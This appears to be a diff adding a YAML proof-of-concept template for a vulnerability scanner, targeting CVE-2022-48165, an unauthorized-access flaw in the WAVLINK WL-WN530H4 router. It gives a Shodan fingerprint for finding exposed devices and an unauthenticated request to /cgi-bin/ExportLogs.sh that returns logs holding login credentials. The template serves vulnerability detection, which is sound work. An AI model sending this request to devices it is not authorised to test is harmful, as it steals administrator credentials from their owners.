@@ -1,0 +1,16 @@
+id: poc-yaml-wavlink-improper-access-control
+info:
+  name: WAVLINK WL-WN530H4 未授权访问漏洞(CVE-2022-48165)
+  severity: high
+  tags:
+  - CVE-2022-48165
+  - 未授权访问
+  finger: wl-wn530h4
+  shodan: http.favicon.hash:-1350437236
+requests:
+- method: GET
+  path: /cgi-bin/ExportLogs.sh
+  expression: "status_code == 200 \n&& contains(body,\"Login=\")\n&& contains(body,\"\
+    Password=\")\n&& contains(headers,\"filename=\\\"sysLogs.txt\\\"\")\n"
+variables: {}
+transport: http
